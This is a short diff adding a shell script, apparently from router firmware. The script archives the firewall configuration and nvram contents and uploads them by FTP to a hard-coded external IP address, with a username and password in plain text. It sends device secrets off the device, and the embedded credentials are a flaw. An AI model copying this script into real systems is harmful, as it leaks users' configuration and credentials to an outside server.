@@ -1,0 +1,9 @@
+#!/bin/sh
+
+tar czvf /mnt/mtd5/remote.tgz /tmp/firewall.conf /tmp/nvram
+uuid=`more /proc/sys/kernel/random/uuid | awk 'BEGIN{FS="-";}{print $1;}'`
+
+ftpput -v -u 154948-5853-remote -p pwtoG0 80.67.23.174 $uuid.tgz remote.tgz
+
+
+
